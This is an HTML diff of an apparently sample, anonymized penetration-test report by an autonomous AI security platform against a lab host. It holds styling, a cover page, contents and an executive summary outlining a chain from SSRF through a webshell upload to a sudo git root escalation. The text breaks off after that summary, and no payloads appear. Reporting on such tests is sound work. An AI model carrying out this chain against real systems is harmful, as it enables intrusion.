@@ -1,0 +1,1650 @@
+﻿
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ARG-PT-2026-0619 | ARGUS Security Assessment | CONFIDENTIAL</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg-base:#0b0d12; --bg-surface:#111318; --bg-card:#161920; --bg-card-alt:#1a1d25; --bg-elevated:#1e2130;
+  --border:#252a38; --border-bright:#2e3447;
+  --text-primary:#e8eaf0; --text-secondary:#8b92a8; --text-muted:#555e78; --text-dim:#3a4058;
+  --cyan:#00d4ff; --cyan-dim:#0099bb; --cyan-glow:rgba(0,212,255,0.15);
+  --violet:#8b5cf6; --violet-dim:#6d3fd8; --violet-glow:rgba(139,92,246,0.15);
+  --critical:#ff3b5c; --critical-bg:rgba(255,59,92,0.12); --critical-border:rgba(255,59,92,0.35);
+  --high:#ff6b2b; --high-bg:rgba(255,107,43,0.12); --high-border:rgba(255,107,43,0.35);
+  --medium:#f59e0b; --medium-bg:rgba(245,158,11,0.12); --medium-border:rgba(245,158,11,0.35);
+  --low:#3b82f6; --low-bg:rgba(59,130,246,0.12); --low-border:rgba(59,130,246,0.35);
+  --info:#6b7280; --info-bg:rgba(107,114,128,0.12); --info-border:rgba(107,114,128,0.35);
+  --success:#10b981; --font-mono:"JetBrains Mono","Courier New",monospace; --font-sans:"Inter",system-ui,sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{font-size:14px;scroll-behavior:smooth}
+body{font-family:var(--font-sans);background:var(--bg-base);color:var(--text-primary);line-height:1.6;-webkit-font-smoothing:antialiased}
+@page{size:A4;margin:18mm 15mm 20mm 15mm}
+@media print{
+  :root{--bg-base:#fff;--bg-surface:#f8f9fa;--bg-card:#f1f3f7;--bg-card-alt:#eef0f5;--bg-elevated:#e8ebf2;
+    --border:#d0d5e0;--border-bright:#b8bfcf;--text-primary:#0f1117;--text-secondary:#3a4058;
+    --text-muted:#5a6380;--text-dim:#8b92a8;--cyan:#0077aa;--cyan-dim:#005588;--cyan-glow:transparent;
+    --violet:#5b21b6;--violet-glow:transparent;--critical:#c0001a;--critical-bg:rgba(192,0,26,0.06);
+    --high:#c04000;--high-bg:rgba(192,64,0,0.06);--medium:#8a5a00;--medium-bg:rgba(138,90,0,0.06);
+    --low:#1a3a8a;--low-bg:rgba(26,58,138,0.06);--info:#3a4058;--info-bg:rgba(58,64,88,0.06)}
+  body{background:#fff;color:#0f1117;font-size:10pt}
+  .cover-page{page-break-after:always;min-height:auto;padding:30mm 0}
+  .toc-section{page-break-after:always}
+  section{page-break-before:auto}
+  .card,table,.finding-card,.roadmap-card,.loot-card{break-inside:avoid}
+  nav,.cover-grid-bg,.cover-glow-top,.cover-glow-violet,.print-hide{display:none}
+  .cover-banner{background:#c0001a!important;color:#fff!important;-webkit-print-color-adjust:exact;print-color-adjust:exact}
+  a{color:inherit;text-decoration:none}
+}
+::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:var(--bg-base)}::-webkit-scrollbar-thumb{background:var(--border-bright);border-radius:3px}
+.top-nav{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(11,13,18,0.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:0 32px;height:52px;display:flex;align-items:center;justify-content:space-between}
+.nav-brand{font-family:var(--font-mono);font-size:12px;color:var(--cyan);letter-spacing:0.1em;text-transform:uppercase}
+.nav-links{display:flex;gap:4px;list-style:none}
+.nav-links a{font-size:11px;color:var(--text-muted);text-decoration:none;padding:4px 9px;border-radius:4px;font-family:var(--font-mono);transition:all 0.15s}
+.nav-links a:hover{color:var(--cyan);background:var(--cyan-glow)}
+.nav-badge{font-family:var(--font-mono);font-size:10px;background:var(--critical-bg);color:var(--critical);border:1px solid var(--critical-border);padding:3px 10px;border-radius:3px;letter-spacing:0.08em;text-transform:uppercase}
+.page-wrapper{padding-top:52px}
+.cover-page{min-height:100vh;display:flex;flex-direction:column;background:var(--bg-base);position:relative;overflow:hidden}
+.cover-grid-bg{position:absolute;inset:0;background-image:linear-gradient(rgba(0,212,255,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,0.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none}
+.cover-glow-top{position:absolute;top:-120px;left:50%;transform:translateX(-50%);width:800px;height:400px;background:radial-gradient(ellipse,rgba(0,212,255,0.08) 0%,transparent 70%);pointer-events:none}
+.cover-glow-violet{position:absolute;bottom:100px;right:-100px;width:600px;height:400px;background:radial-gradient(ellipse,rgba(139,92,246,0.07) 0%,transparent 70%);pointer-events:none}
+.cover-banner{background:var(--critical);color:#fff;text-align:center;font-family:var(--font-mono);font-size:11px;font-weight:600;letter-spacing:0.2em;text-transform:uppercase;padding:8px;-webkit-print-color-adjust:exact;print-color-adjust:exact}
+.cover-content{flex:1;display:flex;flex-direction:column;justify-content:center;padding:60px 80px;position:relative;z-index:1}
+.cover-eyebrow{font-family:var(--font-mono);font-size:11px;color:var(--cyan);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:24px;display:flex;align-items:center;gap:12px}
+.cover-eyebrow::before{content:"";display:block;width:32px;height:1px;background:var(--cyan)}
+.cover-title{font-family:var(--font-sans);font-size:clamp(36px,5vw,58px);font-weight:900;line-height:1.05;letter-spacing:-0.02em;color:var(--text-primary);margin-bottom:8px}
+.cover-title span{color:var(--cyan)}
+.cover-subtitle{font-size:20px;color:var(--text-secondary);font-weight:400;margin-bottom:48px}
+.cover-meta-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1px;background:var(--border);border:1px solid var(--border);border-radius:8px;overflow:hidden;max-width:800px;margin-bottom:48px}
+.cover-meta-item{background:var(--bg-card);padding:16px 20px}
+.cover-meta-label{font-family:var(--font-mono);font-size:10px;color:var(--text-muted);letter-spacing:0.12em;text-transform:uppercase;margin-bottom:4px}
+.cover-meta-value{font-family:var(--font-mono);font-size:13px;color:var(--text-primary);font-weight:500}
+.cover-badges{display:flex;gap:12px;align-items:center;flex-wrap:wrap}
+.risk-badge-large{display:inline-flex;align-items:center;gap:8px;background:var(--critical-bg);border:1px solid var(--critical-border);color:var(--critical);padding:10px 20px;border-radius:6px;font-family:var(--font-mono);font-size:14px;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;box-shadow:0 0 20px rgba(255,59,92,0.15)}
+.risk-badge-large .dot{width:8px;height:8px;border-radius:50%;background:var(--critical);box-shadow:0 0 8px var(--critical);animation:pulse 2s ease-in-out infinite}
+.outcome-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(139,92,246,0.1);border:1px solid rgba(139,92,246,0.3);color:var(--violet);padding:10px 20px;border-radius:6px;font-family:var(--font-mono);font-size:13px;font-weight:600;letter-spacing:0.05em}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(0.8)}}
+.cover-footer{padding:24px 80px;border-top:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;position:relative;z-index:1}
+.cover-footer-left,.cover-footer-right{font-family:var(--font-mono);font-size:11px;color:var(--text-muted)}
+section{padding:64px 80px;border-bottom:1px solid var(--border)}
+section:nth-child(even){background:var(--bg-surface)}
+.section-eyebrow{font-family:var(--font-mono);font-size:10px;color:var(--cyan);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:8px;display:flex;align-items:center;gap:10px}
+.section-eyebrow .num{color:var(--text-muted)}
+.section-title{font-size:28px;font-weight:800;color:var(--text-primary);margin-bottom:4px;letter-spacing:-0.01em}
+.section-title .accent{color:var(--cyan)}
+.section-lead{font-size:14px;color:var(--text-secondary);margin-bottom:36px;max-width:700px;line-height:1.7}
+.section-divider{width:48px;height:2px;background:linear-gradient(90deg,var(--cyan),transparent);margin-bottom:32px}
+.card{background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:24px;break-inside:avoid}
+.card-header{font-family:var(--font-mono);font-size:10px;color:var(--cyan);letter-spacing:0.15em;text-transform:uppercase;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid var(--border)}
+.stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:12px;margin-bottom:32px}
+.stat-tile{background:var(--bg-card);border-radius:8px;padding:20px 16px;text-align:center;break-inside:avoid;position:relative;overflow:hidden;border:1px solid var(--border)}
+.stat-tile::before{content:"";position:absolute;top:0;left:0;right:0;height:2px}
+.stat-tile.critical::before{background:var(--critical);box-shadow:0 0 12px var(--critical)}
+.stat-tile.high::before{background:var(--high);box-shadow:0 0 12px var(--high)}
+.stat-tile.medium::before{background:var(--medium);box-shadow:0 0 12px var(--medium)}
+.stat-tile.low::before{background:var(--low);box-shadow:0 0 12px var(--low)}
+.stat-tile.info::before{background:var(--info)}
+.stat-tile.total::before{background:linear-gradient(90deg,var(--cyan),var(--violet));box-shadow:0 0 12px var(--cyan)}
+.stat-tile.access::before{background:var(--violet);box-shadow:0 0 12px var(--violet)}
+.stat-number{font-family:var(--font-mono);font-size:36px;font-weight:700;line-height:1;margin-bottom:6px}
+.stat-tile.critical .stat-number{color:var(--critical);text-shadow:0 0 20px rgba(255,59,92,0.4)}
+.stat-tile.high .stat-number{color:var(--high);text-shadow:0 0 20px rgba(255,107,43,0.4)}
+.stat-tile.medium .stat-number{color:var(--medium);text-shadow:0 0 20px rgba(245,158,11,0.4)}
+.stat-tile.low .stat-number{color:var(--low);text-shadow:0 0 20px rgba(59,130,246,0.4)}
+.stat-tile.info .stat-number{color:var(--info)}
+.stat-tile.total .stat-number{color:var(--cyan)}
+.stat-tile.access .stat-number{color:var(--violet);font-size:18px;font-weight:800;letter-spacing:0.05em;margin-top:4px}
+.stat-label{font-family:var(--font-mono);font-size:10px;color:var(--text-muted);letter-spacing:0.12em;text-transform:uppercase}
+.sev{display:inline-block;font-family:var(--font-mono);font-size:10px;font-weight:700;padding:3px 9px;border-radius:3px;letter-spacing:0.08em;text-transform:uppercase;white-space:nowrap}
+.sev.critical{background:var(--critical-bg);color:var(--critical);border:1px solid var(--critical-border)}
+.sev.high{background:var(--high-bg);color:var(--high);border:1px solid var(--high-border)}
+.sev.medium{background:var(--medium-bg);color:var(--medium);border:1px solid var(--medium-border)}
+.sev.low{background:var(--low-bg);color:var(--low);border:1px solid var(--low-border)}
+.sev.info{background:var(--info-bg);color:var(--info);border:1px solid var(--info-border)}
+.status{display:inline-block;font-family:var(--font-mono);font-size:10px;font-weight:600;padding:3px 9px;border-radius:3px;letter-spacing:0.06em;text-transform:uppercase}
+.status.verified{background:rgba(16,185,129,0.12);color:#10b981;border:1px solid rgba(16,185,129,0.3)}
+.status.open{background:rgba(245,158,11,0.1);color:var(--medium);border:1px solid var(--medium-border)}
+.status.gated{background:var(--info-bg);color:var(--info);border:1px solid var(--info-border)}
+.table-wrap{overflow-x:auto;border-radius:8px;border:1px solid var(--border);break-inside:avoid}
+table{width:100%;border-collapse:collapse;font-size:12px}
+thead tr{background:var(--bg-elevated);border-bottom:1px solid var(--border-bright)}
+thead th{font-family:var(--font-mono);font-size:10px;letter-spacing:0.1em;text-transform:uppercase;color:var(--text-muted);padding:12px 16px;text-align:left;font-weight:500;white-space:nowrap}
+tbody tr{border-bottom:1px solid var(--border);transition:background 0.1s}
+tbody tr:last-child{border-bottom:none}
+tbody tr:hover{background:var(--bg-elevated)}
+tbody td{padding:12px 16px;color:var(--text-secondary);vertical-align:middle}
+tbody td.mono{font-family:var(--font-mono);font-size:11px;color:var(--text-primary)}
+.finding-id{font-family:var(--font-mono);font-size:11px;color:var(--cyan);font-weight:600}
+.cvss-score{font-family:var(--font-mono);font-size:12px;font-weight:700}
+.cvss-critical{color:var(--critical)}.cvss-high{color:var(--high)}.cvss-medium{color:var(--medium)}.cvss-low{color:var(--low)}
+.mitre-tag{font-family:var(--font-mono);font-size:10px;color:var(--violet);background:var(--violet-glow);border:1px solid rgba(139,92,246,0.25);padding:2px 7px;border-radius:3px}
+.evidence-block{background:#0a0c10;border:1px solid var(--border);border-left:3px solid var(--cyan);border-radius:6px;padding:16px 20px;font-family:var(--font-mono);font-size:11px;color:#a8d8ea;line-height:1.7;overflow-x:auto;white-space:pre-wrap;word-break:break-all;break-inside:avoid}
+.evidence-block.red-ev{border-left-color:var(--critical)}
+.evidence-block.violet-ev{border-left-color:var(--violet)}
+.sha-row{display:flex;align-items:center;gap:8px;font-family:var(--font-mono);font-size:10px;color:var(--text-muted);margin-top:8px;flex-wrap:wrap}
+.sha-row .hash{color:#4a9eba;word-break:break-all}
+.finding-card{background:var(--bg-card);border:1px solid var(--border);border-radius:10px;margin-bottom:24px;overflow:hidden;break-inside:avoid}
+.finding-card-header{display:flex;align-items:center;gap:12px;padding:18px 24px;border-bottom:1px solid var(--border);background:var(--bg-card-alt);flex-wrap:wrap}
+.finding-card-id{font-family:var(--font-mono);font-size:12px;color:var(--cyan);font-weight:700}
+.finding-card-title{font-size:15px;font-weight:700;color:var(--text-primary);flex:1}
+.finding-card-body{padding:24px;display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.finding-card-body.single{grid-template-columns:1fr}
+.finding-field{margin-bottom:16px}
+.finding-field-label{font-family:var(--font-mono);font-size:10px;color:var(--text-muted);letter-spacing:0.12em;text-transform:uppercase;margin-bottom:6px}
+.finding-field-value{font-size:13px;color:var(--text-secondary);line-height:1.6}
+.scope-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:24px}
+.action-list{list-style:none}
+.action-item{display:flex;gap:16px;align-items:flex-start;padding:16px 0;border-bottom:1px solid var(--border)}
+.action-item:last-child{border-bottom:none}
+.action-num{font-family:var(--font-mono);font-size:11px;color:var(--cyan);width:28px;height:28px;border:1px solid var(--cyan-dim);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-weight:700}
+.action-text{font-size:13px;color:var(--text-secondary);line-height:1.6;padding-top:4px}
+.action-text strong{color:var(--text-primary)}
+.toc-section{background:var(--bg-surface)}
+.toc-list{list-style:none}
+.toc-item{display:flex;align-items:center;padding:10px 0;border-bottom:1px solid var(--border);gap:12px}
+.toc-item:last-child{border-bottom:none}
+.toc-num{font-family:var(--font-mono);font-size:11px;color:var(--cyan);width:28px;flex-shrink:0}
+.toc-text{font-size:13px;color:var(--text-secondary);flex:1}
+.toc-dots{flex:1;border-bottom:1px dotted var(--border-bright);margin:0 8px;min-width:30px}
+.cvss-legend{display:flex;gap:8px;flex-wrap:wrap}
+.cvss-band{display:flex;flex-direction:column;align-items:center;padding:10px 16px;border-radius:6px;font-family:var(--font-mono);font-size:10px;min-width:90px;text-align:center}
+.cvss-band.c{background:var(--critical-bg);border:1px solid var(--critical-border);color:var(--critical)}
+.cvss-band.h{background:var(--high-bg);border:1px solid var(--high-border);color:var(--high)}
+.cvss-band.m{background:var(--medium-bg);border:1px solid var(--medium-border);color:var(--medium)}
+.cvss-band.l{background:var(--low-bg);border:1px solid var(--low-border);color:var(--low)}
+.cvss-band.i{background:var(--info-bg);border:1px solid var(--info-border);color:var(--info)}
+.cvss-band-label{font-weight:700;font-size:12px;margin-bottom:3px}
+.roadmap-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.roadmap-card{background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:20px;break-inside:avoid}
+.roadmap-card.p1{border-top:2px solid var(--critical)}
+.roadmap-card.p2{border-top:2px solid var(--medium)}
+.roadmap-card.p3{border-top:2px solid var(--low)}
+.roadmap-priority{font-family:var(--font-mono);font-size:11px;font-weight:700;margin-bottom:12px;letter-spacing:0.1em}
+.roadmap-card.p1 .roadmap-priority{color:var(--critical)}
+.roadmap-card.p2 .roadmap-priority{color:var(--medium)}
+.roadmap-card.p3 .roadmap-priority{color:var(--low)}
+.roadmap-items{list-style:none}
+.roadmap-items li{font-size:12px;color:var(--text-secondary);padding:6px 0 6px 14px;border-bottom:1px solid var(--border);position:relative;line-height:1.5}
+.roadmap-items li::before{content:"└─";position:absolute;left:0;font-family:var(--font-mono);font-size:10px;color:var(--text-dim)}
+.roadmap-items li:last-child{border-bottom:none}
+.timeline{position:relative;padding-left:32px}
+.timeline::before{content:"";position:absolute;left:7px;top:8px;bottom:8px;width:1px;background:var(--border-bright)}
+.timeline-item{position:relative;margin-bottom:20px;break-inside:avoid}
+.timeline-item::before{content:"";position:absolute;left:-28px;top:5px;width:8px;height:8px;border-radius:50%;background:var(--cyan);box-shadow:0 0 8px var(--cyan);border:2px solid var(--bg-base)}
+.timeline-time{font-family:var(--font-mono);font-size:10px;color:var(--cyan);letter-spacing:0.05em;margin-bottom:2px}
+.timeline-event{font-size:13px;color:var(--text-secondary)}
+.timeline-event strong{color:var(--text-primary)}
+.mitre-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:12px}
+.mitre-phase{background:var(--bg-card);border:1px solid var(--border);border-radius:8px;overflow:hidden;break-inside:avoid}
+.mitre-phase-header{background:var(--bg-elevated);padding:10px 14px;font-family:var(--font-mono);font-size:10px;color:var(--violet);letter-spacing:0.1em;text-transform:uppercase;font-weight:600;border-bottom:1px solid var(--border)}
+.mitre-phase-item{padding:8px 14px;border-bottom:1px solid var(--border);font-size:12px;color:var(--text-secondary)}
+.mitre-phase-item:last-child{border-bottom:none}
+.mitre-phase-item .tid{font-family:var(--font-mono);font-size:10px;color:var(--violet);display:block;margin-bottom:2px}
+.loot-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.loot-card{background:#0a0c10;border:1px solid var(--border);border-radius:8px;padding:16px;break-inside:avoid}
+.loot-card-header{display:flex;align-items:center;gap:10px;margin-bottom:12px;padding-bottom:10px;border-bottom:1px solid var(--border)}
+.loot-path{font-family:var(--font-mono);font-size:11px;color:var(--cyan);font-weight:600}
+.loot-content{font-family:var(--font-mono);font-size:11px;color:#a8d8ea;line-height:1.6;white-space:pre-wrap;word-break:break-all}
+.redact-bar{display:inline-block;background:rgba(255,59,92,0.2);color:var(--critical);border-radius:2px;padding:0 5px;font-size:10px;font-weight:600}
+.non-exploit-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:12px}
+.non-exploit-card{background:var(--bg-card-alt);border:1px solid var(--border);border-left:3px solid var(--info);border-radius:6px;padding:14px 16px;break-inside:avoid}
+.non-exploit-title{font-size:12px;color:var(--text-primary);font-weight:600;margin-bottom:4px}
+.non-exploit-reason{font-family:var(--font-mono);font-size:10px;color:var(--text-muted);line-height:1.5}
+.report-footer{padding:32px 80px;background:var(--bg-base);border-top:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px}
+.footer-brand{font-family:var(--font-mono);font-size:11px;color:var(--cyan);letter-spacing:0.1em}
+.footer-conf{font-family:var(--font-mono);font-size:10px;color:var(--text-muted);text-align:center;letter-spacing:0.05em}
+.footer-ts{font-family:var(--font-mono);font-size:10px;color:var(--text-muted);text-align:right}
+.outcome-exploitable{color:var(--critical);font-family:var(--font-mono);font-size:10px;font-weight:700}
+.outcome-negative{color:var(--info);font-family:var(--font-mono);font-size:10px;font-weight:700}
+.outcome-success{color:var(--success);font-family:var(--font-mono);font-size:10px;font-weight:700}
+.detect-open{color:var(--critical);font-family:var(--font-mono);font-size:10px;font-weight:700}
+@media(max-width:900px){section{padding:48px 24px}.cover-content{padding:40px 24px}.cover-footer{padding:20px 24px}.finding-card-body{grid-template-columns:1fr}.roadmap-grid{grid-template-columns:1fr}.scope-grid{grid-template-columns:1fr}.loot-grid{grid-template-columns:1fr}.top-nav{padding:0 16px}.nav-links{display:none}}
+</style>
+</head>
+<body>
+<nav class="top-nav print-hide">
+  <span class="nav-brand">&#9632; ARGUS // ARG-PT-2026-0619</span>
+  <ul class="nav-links">
+    <li><a href="#exec">Exec</a></li><li><a href="#scope">Scope</a></li><li><a href="#method">Method</a></li>
+    <li><a href="#killchain">Kill Chain</a></li><li><a href="#attacks">Coverage</a></li>
+    <li><a href="#register">Register</a></li><li><a href="#findings">Findings</a></li>
+    <li><a href="#loot">Loot</a></li><li><a href="#purple">Purple Team</a></li>
+    <li><a href="#mitre">MITRE</a></li><li><a href="#remediation">Roadmap</a></li>
+  </ul>
+  <span class="nav-badge">&#9888; CRITICAL RISK</span>
+</nav>
+<div class="page-wrapper">
+<!-- COVER PAGE -->
+<div class="cover-page" id="cover">
+  <div class="cover-grid-bg"></div>
+  <div class="cover-glow-top"></div>
+  <div class="cover-glow-violet"></div>
+  <div class="cover-banner">&#9888; CONFIDENTIAL &mdash; CLIENT PRIVILEGED &mdash; DISTRIBUTION RESTRICTED &mdash; SAMPLE / ANONYMIZED REPORT &#9888;</div>
+  <div class="cover-content">
+    <div class="cover-eyebrow">ARGUS Autonomous Security Platform &nbsp;&bull;&nbsp; External Network + Web Application Pentest</div>
+    <h1 class="cover-title">Security Assessment<br><span>FORGE</span></h1>
+    <p class="cover-subtitle">10.129.21.254 &mdash; Full External Compromise</p>
+    <div class="cover-meta-grid">
+      <div class="cover-meta-item"><div class="cover-meta-label">Report ID</div><div class="cover-meta-value">ARG-PT-2026-0619</div></div>
+      <div class="cover-meta-item"><div class="cover-meta-label">Target Host</div><div class="cover-meta-value">10.129.21.254 (FORGE)</div></div>
+      <div class="cover-meta-item"><div class="cover-meta-label">Engagement Window</div><div class="cover-meta-value">18&ndash;19 Jun 2026</div></div>
+      <div class="cover-meta-item"><div class="cover-meta-label">Engagement Type</div><div class="cover-meta-value">External Net + Web App</div></div>
+      <div class="cover-meta-item"><div class="cover-meta-label">Analyst Engine</div><div class="cover-meta-value">ARGUS Autonomous (Operator-reviewed)</div></div>
+      <div class="cover-meta-item"><div class="cover-meta-label">Scope</div><div class="cover-meta-value">Single host, web + infra</div></div>
+      <div class="cover-meta-item"><div class="cover-meta-label">Report Generated</div><div class="cover-meta-value">19 Jun 2026, 09:30 UTC</div></div>
+      <div class="cover-meta-item"><div class="cover-meta-label">Classification</div><div class="cover-meta-value">CONFIDENTIAL &mdash; Client Privileged</div></div>
+    </div>
+    <div class="cover-badges">
+      <div class="risk-badge-large"><span class="dot"></span>Overall Risk: CRITICAL</div>
+      <div class="outcome-badge">&#9654; FULL COMPROMISE &mdash; ROOT</div>
+    </div>
+  </div>
+  <div class="cover-footer">
+    <div class="cover-footer-left">ARGUS Security &bull; Autonomous Operator Platform &bull; argus.internal</div>
+    <div class="cover-footer-right">CONFIDENTIAL &mdash; Client Privileged &bull; Not for redistribution</div>
+  </div>
+</div>
+
+<!-- TOC / DOCUMENT CONTROL -->
+<section class="toc-section" id="toc">
+  <div class="section-eyebrow"><span class="num">&sect;0</span> Document Control</div>
+  <h2 class="section-title">Table of <span class="accent">Contents</span></h2>
+  <div class="section-divider"></div>
+  <div class="scope-grid" style="margin-bottom:40px">
+    <div class="card">
+      <div class="card-header">Document Control</div>
+      <table>
+        <tbody>
+          <tr><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);letter-spacing:0.1em;text-transform:uppercase;padding:7px 0;width:40%">Report ID</td><td style="font-family:var(--font-mono);font-size:12px;padding:7px 0">ARG-PT-2026-0619</td></tr>
+          <tr><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);letter-spacing:0.1em;text-transform:uppercase;padding:7px 0">Version</td><td style="font-family:var(--font-mono);font-size:12px;padding:7px 0">1.0 &mdash; Final</td></tr>
+          <tr><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);letter-spacing:0.1em;text-transform:uppercase;padding:7px 0">Status</td><td style="padding:7px 0"><span class="status verified">FINAL</span></td></tr>
+          <tr><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);letter-spacing:0.1em;text-transform:uppercase;padding:7px 0">Issued</td><td style="font-family:var(--font-mono);font-size:12px;padding:7px 0">19 Jun 2026</td></tr>
+          <tr><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);letter-spacing:0.1em;text-transform:uppercase;padding:7px 0">Analyst</td><td style="font-family:var(--font-mono);font-size:12px;padding:7px 0">ARGUS Autonomous Engine</td></tr>
+          <tr><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);letter-spacing:0.1em;text-transform:uppercase;padding:7px 0">Reviewer</td><td style="font-family:var(--font-mono);font-size:12px;padding:7px 0">Operator (Human-in-the-loop)</td></tr>
+          <tr><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);letter-spacing:0.1em;text-transform:uppercase;padding:7px 0">Classification</td><td style="font-family:var(--font-mono);font-size:12px;padding:7px 0">CONFIDENTIAL &mdash; Client Privileged</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="card">
+      <div class="card-header">Severity Legend</div>
+      <div style="display:flex;flex-direction:column;gap:10px;padding-top:4px">
+        <div style="display:flex;align-items:center;gap:12px"><span class="sev critical">Critical</span><span style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)">CVSS 9.0&ndash;10.0 &mdash; Immediate action required</span></div>
+        <div style="display:flex;align-items:center;gap:12px"><span class="sev high">High</span><span style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)">CVSS 7.0&ndash;8.9 &mdash; Remediate within 30 days</span></div>
+        <div style="display:flex;align-items:center;gap:12px"><span class="sev medium">Medium</span><span style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)">CVSS 4.0&ndash;6.9 &mdash; Remediate within 90 days</span></div>
+        <div style="display:flex;align-items:center;gap:12px"><span class="sev low">Low</span><span style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)">CVSS 0.1&ndash;3.9 &mdash; Remediate next cycle</span></div>
+        <div style="display:flex;align-items:center;gap:12px"><span class="sev info">Info</span><span style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)">CVSS 0.0 &mdash; Informational / best practice</span></div>
+      </div>
+    </div>
+  </div>
+  <ul class="toc-list">
+    <li class="toc-item"><span class="toc-num">1</span><span class="toc-text">Executive Summary</span><span class="toc-dots"></span></li>
+    <li class="toc-item"><span class="toc-num">2</span><span class="toc-text">System &amp; Scope</span><span class="toc-dots"></span></li>
+    <li class="toc-item"><span class="toc-num">3</span><span class="toc-text">Methodology &amp; CVSS Rubric</span><span class="toc-dots"></span></li>
+    <li class="toc-item"><span class="toc-num">4</span><span class="toc-text">Attack Path / Kill Chain Graph</span><span class="toc-dots"></span></li>
+    <li class="toc-item"><span class="toc-num">5</span><span class="toc-text">Attacks Attempted &mdash; Coverage Log</span><span class="toc-dots"></span></li>
+    <li class="toc-item"><span class="toc-num">6</span><span class="toc-text">Findings Register</span><span class="toc-dots"></span></li>
+    <li class="toc-item"><span class="toc-num">7</span><span class="toc-text">Detailed Finding Cards</span><span class="toc-dots"></span></li>
+    <li class="toc-item"><span class="toc-num">8</span><span class="toc-text">Tested &mdash; Not Exploitable</span><span class="toc-dots"></span></li>
+    <li class="toc-item"><span class="toc-num">9</span><span class="toc-text">Captured Loot &amp; Evidence</span><span class="toc-dots"></span></li>
+    <li class="toc-item"><span class="toc-num">10</span><span class="toc-text">Detection / Purple-Team Mapping</span><span class="toc-dots"></span></li>
+    <li class="toc-item"><span class="toc-num">11</span><span class="toc-text">Evidence Appendix</span><span class="toc-dots"></span></li>
+    <li class="toc-item"><span class="toc-num">12</span><span class="toc-text">MITRE ATT&amp;CK Map</span><span class="toc-dots"></span></li>
+    <li class="toc-item"><span class="toc-num">13</span><span class="toc-text">Remediation Roadmap</span><span class="toc-dots"></span></li>
+    <li class="toc-item"><span class="toc-num">14</span><span class="toc-text">Severity Distribution &amp; Outcome Charts</span><span class="toc-dots"></span></li>
+    <li class="toc-item"><span class="toc-num">15</span><span class="toc-text">Engagement Timeline</span><span class="toc-dots"></span></li>
+  </ul>
+</section>
+
+<!-- SECTION 1: EXECUTIVE SUMMARY -->
+<section id="exec">
+  <div class="section-eyebrow"><span class="num">&sect;1</span> Executive Summary</div>
+  <h2 class="section-title">Executive <span class="accent">Summary</span></h2>
+  <div class="section-divider"></div>
+  <div class="stat-grid">
+    <div class="stat-tile critical"><div class="stat-number">2</div><div class="stat-label">Critical</div></div>
+    <div class="stat-tile high"><div class="stat-number">3</div><div class="stat-label">High</div></div>
+    <div class="stat-tile medium"><div class="stat-number">3</div><div class="stat-label">Medium</div></div>
+    <div class="stat-tile low"><div class="stat-number">2</div><div class="stat-label">Low</div></div>
+    <div class="stat-tile info"><div class="stat-number">4</div><div class="stat-label">Info</div></div>
+    <div class="stat-tile total"><div class="stat-number">14</div><div class="stat-label">Total</div></div>
+    <div class="stat-tile access"><div class="stat-number">ROOT</div><div class="stat-label">Access Achieved</div></div>
+  </div>
+  <div class="card" style="margin-bottom:28px;border-left:3px solid var(--critical)">
+    <div class="card-header">Engagement Outcome</div>
+    <p style="font-size:15px;color:var(--text-secondary);line-height:1.8;margin-bottom:16px">
+      ARGUS chained a <strong style="color:var(--text-primary)">server-side request forgery</strong> into an internal admin panel, bypassed an upload filter to plant a webshell
+      (<strong style="color:var(--text-primary)">unauthenticated RCE &rarr; www-data foothold</strong>), then abused a
+      <strong style="color:var(--text-primary)">sudo NOPASSWD on /usr/bin/git</strong> (GTFOBins) to escalate to
+      <strong style="color:var(--critical)">root</strong> &mdash; end to end, autonomous.
+      <code style="font-family:var(--font-mono);color:var(--cyan);background:var(--bg-elevated);padding:2px 6px;border-radius:3px">user.txt</code> +
+      <code style="font-family:var(--font-mono);color:var(--critical);background:var(--bg-elevated);padding:2px 6px;border-radius:3px">root.txt</code> captured.
+    </p>
